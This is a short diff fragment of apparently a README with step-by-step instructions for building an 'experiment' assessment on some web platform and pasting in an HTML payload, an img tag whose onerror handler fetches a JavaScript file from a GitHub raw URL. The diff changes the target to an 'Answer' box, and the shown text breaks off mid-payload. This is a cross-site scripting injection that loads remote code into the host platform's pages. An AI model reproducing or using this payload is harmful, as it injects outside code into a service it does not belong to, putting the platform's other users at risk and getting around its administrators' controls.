@@ -5,7 +5,7 @@ Instructions:
 2. Click "Build New Experiment"
 3. Click the full grey box (or the split ones, it doesn't really matter)
 4. Click the paper with the checkmarks, and click "Add an Assessment"
-5. Choose "Multiple Choice", and paste this in the "Questions" box:
+5. Choose "Multiple Choice", and paste this into one of the "Answer" boxes:
 ```
 <img src=# onerror='
   fetch(`https://raw.githubusercontent.com/cam0studios/browser/main/main.js`)
